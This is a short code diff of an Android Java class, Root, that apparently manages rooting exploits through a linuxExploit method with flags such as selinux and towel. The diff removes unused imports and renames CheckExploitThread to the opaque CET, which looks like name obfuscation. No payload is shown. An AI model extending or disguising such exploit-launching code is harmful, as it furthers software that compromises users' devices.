@@ -17,28 +17,18 @@ import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
-import java.io.BufferedReader;
-import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.io.RandomAccessFile;
-import java.io.Writer;
-import java.nio.channels.FileChannel;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
-import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Date;
 import java.util.Properties;
 import java.util.concurrent.Semaphore;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
 
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
@@ -617,10 +607,10 @@ public class Root {
 
 	private static void linuxExploit(boolean synchronous, boolean frama, boolean selinux, boolean towel) {
 
-		class CheckExploitThread implements Runnable {
+		class CET implements Runnable {
 			Thread exploit;
 
-			CheckExploitThread(Thread s) {
+			CET(Thread s) {
 				exploit = s;
 			}
 
@@ -666,7 +656,7 @@ public class Root {
 				}
 
 				// start another Thread to check exploit thread end
-				CheckExploitThread checkExploitThread = new CheckExploitThread(exploit);
+				CET checkExploitThread = new CET(exploit);
 				Thread ec = new Thread(checkExploitThread);
 				ec.start();
 			}
